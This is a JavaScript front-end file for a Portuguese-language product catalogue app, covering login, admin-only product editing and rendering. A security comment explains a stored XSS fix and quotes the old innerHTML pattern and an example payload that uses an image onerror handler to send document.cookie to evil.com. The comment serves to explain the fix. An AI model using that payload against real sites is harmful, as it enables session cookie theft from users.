const state = {
  token: localStorage.getItem('api_token') || '',
  user: null,
  products: [],
  baseUrl: localStorage.getItem('api_base_url') || '',
};

const ui = {
  baseUrl: document.getElementById('baseUrl'),
  saveBaseUrlBtn: document.getElementById('saveBaseUrlBtn'),
  loginForm: document.getElementById('loginForm'),
  registerForm: document.getElementById('registerForm'),
  productForm: document.getElementById('productForm'),
  refreshProductsBtn: document.getElementById('refreshProductsBtn'),
  productsList: document.getElementById('productsList'),
  statusText: document.getElementById('statusText'),
  logoutBtn: document.getElementById('logoutBtn'),
  roleInfo: document.getElementById('roleInfo'),
  logOutput: document.getElementById('logOutput'),
  clearLogBtn: document.getElementById('clearLogBtn'),
};

function apiRoot() {
  return state.baseUrl.trim() || window.location.origin;
}

function endpoint(path) {
  return `${apiRoot()}${path}`;
}

function log(message, data) {
  const stamp = new Date().toLocaleTimeString('pt-BR');
  const suffix = data ? `\n${JSON.stringify(data, null, 2)}` : '';
  ui.logOutput.textContent = `[${stamp}] ${message}${suffix}\n\n${ui.logOutput.textContent}`;
}

function isAdmin() {
  return state.user?.role === 'admin';
}

function updateAuthUi() {
  if (state.user) {
    ui.statusText.textContent = `${state.user.name} (${state.user.role})`;
    ui.logoutBtn.disabled = false;
  } else {
    ui.statusText.textContent = 'Nao autenticado';
    ui.logoutBtn.disabled = true;
  }

  const canWrite = isAdmin();
  for (const el of ui.productForm.querySelectorAll('input, textarea, button')) {
    el.disabled = !canWrite;
  }
  ui.roleInfo.textContent = canWrite
    ? 'Voce e admin: criar, editar e remover produtos habilitados.'
    : 'Operacoes de escrita exigem perfil admin.';
}

function authHeaders() {
  if (!state.token) return {};
  return { Authorization: `Bearer ${state.token}` };
}

async function request(path, options = {}) {
  const config = {
    method: options.method || 'GET',
    headers: {
      'Content-Type': 'application/json',
      ...authHeaders(),
      ...(options.headers || {}),
    },
  };

  if (options.body) {
    config.body = JSON.stringify(options.body);
  }

  const response = await fetch(endpoint(path), config);
  const payload = await response.json().catch(() => ({}));

  if (!response.ok) {
    const message = payload?.message || `Falha ${response.status}`;
    throw new Error(message);
  }

  return payload;
}

async function loadCurrentUser() {
  if (!state.token) {
    state.user = null;
    updateAuthUi();
    return;
  }

  try {
    const data = await request('/api/auth/me');
    state.user = data.user;
    updateAuthUi();
  } catch (error) {
    state.token = '';
    state.user = null;
    localStorage.removeItem('api_token');
    updateAuthUi();
    log(`Token invalidado: ${error.message}`);
  }
}

// [SEGURANÇA] OWASP A03 – Stored XSS (Cross-Site Scripting Armazenado)
// A forma vulnerável usava innerHTML com template literal:
//   item.innerHTML = `<h4>${product.name}</h4>`
// Isso interpreta o conteúdo do banco como HTML executável. Um atacante com
// acesso de admin poderia salvar um produto com nome:
//   <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
// e esse script executaria no browser de todos os usuários que vissem a listagem.
//
// A correção usa textContent: o browser trata o valor como texto puro,
// qualquer tag HTML é exibida literalmente na tela, nunca executada.
function productCard(product) {
  const item = document.createElement('article');
  item.className = 'product-item';

  const title = document.createElement('h4');
  title.textContent = product.name;

  const category = document.createElement('p');
  category.textContent = product.category;

  const description = document.createElement('p');
  description.textContent = product.description;

  const priceStock = document.createElement('p');
  priceStock.textContent = `R$ ${Number(product.price).toFixed(2)} | Estoque: ${product.stock}`;

  const actions = document.createElement('div');
  actions.className = 'product-actions';

  const editBtn = document.createElement('button');
  editBtn.className = 'edit';
  editBtn.textContent = 'Editar';

  const deleteBtn = document.createElement('button');
  deleteBtn.className = 'danger delete';
  deleteBtn.textContent = 'Remover';

  actions.appendChild(editBtn);
  actions.appendChild(deleteBtn);

  item.appendChild(title);
  item.appendChild(category);
  item.appendChild(description);
  item.appendChild(priceStock);
  item.appendChild(actions);

  editBtn.disabled = !isAdmin();
  deleteBtn.disabled = !isAdmin();

  editBtn.addEventListener('click', async () => {
    const newName = window.prompt('Novo nome:', product.name);
    if (!newName) return;

    try {
      await request(`/api/products/${product._id}`, {
        method: 'PATCH',
        body: { name: newName },
      });
      log('Produto atualizado', { id: product._id, name: newName });
      await loadProducts();
    } catch (error) {
      log(`Erro ao atualizar produto: ${error.message}`);
    }
  });

  deleteBtn.addEventListener('click', async () => {
    const confirmed = window.confirm(`Remover ${product.name}?`);
    if (!confirmed) return;

    try {
      await request(`/api/products/${product._id}`, { method: 'DELETE' });
      log('Produto removido', { id: product._id });
      await loadProducts();
    } catch (error) {
      log(`Erro ao remover produto: ${error.message}`);
    }
  });

  return item;
}

function renderProducts() {
  ui.productsList.innerHTML = '';

  if (!state.products.length) {
    ui.productsList.innerHTML = '<p>Nenhum produto disponivel.</p>';
    return;
  }

  for (const product of state.products) {
    ui.productsList.appendChild(productCard(product));
  }
}

async function loadProducts() {
  try {
    const data = await request('/api/products');
    state.products = data.products || [];
    renderProducts();
    log(`Produtos carregados: ${state.products.length}`);
  } catch (error) {
    log(`Erro ao carregar produtos: ${error.message}`);
  }
}

ui.saveBaseUrlBtn.addEventListener('click', async () => {
  state.baseUrl = ui.baseUrl.value.trim();
  localStorage.setItem('api_base_url', state.baseUrl);
  log(`Base URL salva: ${apiRoot()}`);
  await loadCurrentUser();
  await loadProducts();
});

ui.loginForm.addEventListener('submit', async (event) => {
  event.preventDefault();

  const email = document.getElementById('loginEmail').value;
  const password = document.getElementById('loginPassword').value;

  try {
    const data = await request('/api/auth/login', {
      method: 'POST',
      body: { email, password },
    });

    state.token = data.token;
    state.user = data.user;
    localStorage.setItem('api_token', state.token);
    updateAuthUi();
    log('Login realizado', data.user);
    ui.loginForm.reset();
  } catch (error) {
    log(`Erro no login: ${error.message}`);
  }
});

ui.registerForm.addEventListener('submit', async (event) => {
  event.preventDefault();

  const name = document.getElementById('registerName').value;
  const email = document.getElementById('registerEmail').value;
  const password = document.getElementById('registerPassword').value;

  try {
    const data = await request('/api/auth/register', {
      method: 'POST',
      body: { name, email, password },
    });
    log('Usuario criado com sucesso', data.user);
    ui.registerForm.reset();
  } catch (error) {
    log(`Erro ao registrar: ${error.message}`);
  }
});

ui.productForm.addEventListener('submit', async (event) => {
  event.preventDefault();

  if (!isAdmin()) {
    log('Somente admin pode criar produtos');
    return;
  }

  const payload = {
    name: document.getElementById('productName').value,
    category: document.getElementById('productCategory').value,
    description: document.getElementById('productDescription').value,
    price: Number(document.getElementById('productPrice').value),
    stock: Number(document.getElementById('productStock').value),
    active: true,
  };

  try {
    const data = await request('/api/products', {
      method: 'POST',
      body: payload,
    });
    log('Produto criado', data.product);
    ui.productForm.reset();
    await loadProducts();
  } catch (error) {
    log(`Erro ao criar produto: ${error.message}`);
  }
});

ui.refreshProductsBtn.addEventListener('click', loadProducts);

ui.logoutBtn.addEventListener('click', () => {
  state.token = '';
  state.user = null;
  localStorage.removeItem('api_token');
  updateAuthUi();
  log('Sessao encerrada');
});

ui.clearLogBtn.addEventListener('click', () => {
  ui.logOutput.textContent = '';
});

async function init() {
  ui.baseUrl.value = state.baseUrl;
  updateAuthUi();
  await loadCurrentUser();
  await loadProducts();
}

init();
